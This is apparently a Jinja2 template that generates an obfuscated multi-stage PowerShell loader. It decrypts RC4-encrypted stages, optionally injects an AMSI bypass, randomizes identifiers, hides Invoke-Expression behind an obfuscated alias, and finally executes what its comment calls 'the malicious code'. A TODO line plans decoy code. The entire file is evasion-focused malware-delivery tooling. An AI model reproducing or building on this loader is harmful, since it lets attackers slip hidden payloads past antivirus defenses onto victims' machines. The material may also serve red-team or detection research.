{#-
    First, load the RC4 algorithm, define `Decrypt-String` and load and the
    `obfuscate` macro.

    Stage 1 should be written such that it survives removing linebreaks and leading whitespace, so try not to use multi-line strings and such and use semicolons.

    TODO: Include decoy code
-#}

{{'$DebugPreference = "Continue"'|debug}}
{{'Write-Debug "Starting up..."'|debug}}
{%- include "powershell/rc4.ps1" -%}

{{separator}}

{{'Write-Debug "Key exchange..."'|debug}}
{%- if kex == 'dh' %}
{%- include "powershell/dh_kex.ps1" %}
{% elif kex == 'embedded' %}
${{symbol_name("global_key")}} = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
{% else %}
${{symbol_name("global_key")}} = [System.Text.Encoding]::UTF8.GetBytes(${{symbol_name("global_key")}});
{% endif -%}

{{separator}}

function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetString(({{symbol_name("Decrypt-RC4")}} ([System.Convert]::FromBase64String($args[0])) ${{symbol_name("global_key")}}))};

{{separator}}

{%- from 'macros.jinja2' import obfuscate with context -%}

{#-
    Now we can use the `obfuscate` macro.
    Next, load the specified AMSI bypass if one is given
-#}

{{'Write-Debug "Load AMSI Bypass..."'|debug}}

{% if amsibypass %}{% include amsibypass %}{% endif %}

{{separator}}

{#- Next, load stage 2. Stage 2 defines helper functions such as `Unpack`. -#}

{{'Write-Debug "Load 2nd stage..."'|debug}}

s`Al {{symbol_name("InvokeExpressionAlias")}} {{obfuscate("Invoke-Expression")}};
{{symbol_name("Decrypt-String")}} "{{stage2}}" | {{symbol_name("InvokeExpressionAlias")}};

{{separator}}

{# Finally, execute stage 3; i.e. the malicious code. -#}

{%- for code in stage3 -%}
{{'Write-Debug "Load 3rd stage..."'|debug}}
{{symbol_name("Unpack")}} "{{code}}" | {{symbol_name("InvokeExpressionAlias")}};
{{separator}}
{%- endfor -%}
